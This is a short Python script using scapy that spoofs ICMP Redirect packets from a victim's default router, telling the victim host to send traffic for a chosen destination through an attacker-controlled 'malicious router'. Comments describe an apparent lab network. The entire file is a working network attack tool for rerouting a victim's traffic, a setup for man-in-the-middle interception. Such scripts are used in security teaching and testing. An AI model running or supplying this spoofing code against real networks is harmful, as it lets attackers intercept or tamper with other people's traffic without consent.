#!/usr/bin/python3
# this program simply spoofs a ICMP Redirect to victim to send the pkt to itself
# Assuming this program runs on A (172.21.4.199) and spoofs with following
# victim: 172.21.4.5 (argv[1],
# victim default router: 172.21.4.254 (argv[2])
# Malicious router: 172.21.4.252 (argv[3])
# -------------------------------
import sys
from scapy.all import *

if len(sys.argv) != 5:
  print("Usage: sys.argv[0]\n" +
                "<victim IP> \n" +
                "<victim's router IP>\n" +
		"<malicious router IP>\n" + 
		"destination host IP>")
  exit()

victim_ip = sys.argv[1]
victim_router = sys.argv[2]
malicious_router = sys.argv[3]
dstn_ip = sys.argv[4]

ip = IP(src=victim_router, dst=victim_ip)
icmp = ICMP(type=5, code=1) # ICMP Redirect message
icmp.gw = malicious_router
ip2 = IP(src=victim_ip, dst=dstn_ip)
pkt = ip/icmp/ip2/ICMP() # Assumption, victim is sending ICMP pkts

for i in range(3):
  send(pkt,verbose=0)
